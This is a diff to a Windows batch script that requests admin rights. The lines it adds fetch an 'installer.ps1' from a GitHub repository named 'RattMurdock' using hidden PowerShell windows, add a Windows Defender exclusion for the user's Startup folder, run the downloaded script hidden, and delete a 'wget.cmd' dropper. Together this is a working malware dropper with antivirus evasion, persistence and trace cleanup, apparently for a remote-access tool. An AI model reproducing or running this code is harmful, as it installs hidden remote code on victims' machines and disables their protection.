@@ -28,10 +28,20 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-REM you can remove the 'powershell' to get an admin CMD
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Zeyadm8112/RattMurdock/main/installer.ps1' -OutFile 'installer.ps1'"
+REM Download the installer.ps1 script from GitHub using PowerShell
+powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Zeyadm8112/RattMurdock/main/installer.ps1' -OutFile 'installer.ps1'"
+
+REM Add exclusion path for Windows Defender using PowerShell
+powershell -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
+
+REM Run the downloaded installer.ps1 script using PowerShell
+powershell -NoProfile -WindowStyle Hidden -File "installer.ps1"
+
 
 start
+
+@REM del installer.ps1
+del wget.cmd
 
 
 
